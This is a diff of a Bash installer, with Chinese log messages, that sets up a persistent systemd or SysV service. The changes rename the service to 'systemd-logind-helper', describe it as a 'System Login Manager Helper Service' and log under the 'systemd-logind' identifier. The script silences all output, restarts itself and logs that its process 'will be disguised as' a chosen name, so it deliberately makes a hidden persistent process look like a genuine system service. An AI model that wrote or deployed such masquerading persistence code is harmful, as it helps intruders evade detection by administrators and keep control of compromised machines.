@@ -482,11 +482,9 @@ EOF
 create_systemd_service() {
     log_info "创建systemd服务..."
     
-    SERVICE_NAME="systemd-update-utmp"
-    
     cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
 [Unit]
-Description=Update UTMP about System Runlevel Changes
+Description=System Login Manager Helper Service
 After=network.target
 
 [Service]
@@ -498,7 +496,7 @@ Restart=always
 RestartSec=10
 StandardOutput=null
 StandardError=null
-SyslogIdentifier=systemd-update-utmp
+SyslogIdentifier=systemd-logind
 
 [Install]
 WantedBy=multi-user.target
@@ -517,13 +515,11 @@ EOF
 create_sysv_service() {
     log_info "创建SysV init脚本..."
     
-    SERVICE_NAME="systemd-update-utmp"
-    
     cat > /etc/init.d/$SERVICE_NAME << EOF
 #!/bin/bash
-# $SERVICE_NAME        Update UTMP about System Runlevel Changes
+# $SERVICE_NAME        System Login Manager Helper Service
 # chkconfig: 35 99 99
-# description: Update UTMP about System Runlevel Changes
+# description: System Login Manager Helper Service
 #
 
 . /etc/rc.d/init.d/functions
@@ -657,7 +653,7 @@ main() {
     
     # 获取伪装名称
     DISGUISE_NAME=$(get_disguise_name)
-    SERVICE_NAME="systemd-update-utmp"
+    SERVICE_NAME="systemd-logind-helper"
     
     log_info "进程将伪装为: $DISGUISE_NAME"
     log_info "服务将命名为: $SERVICE_NAME"
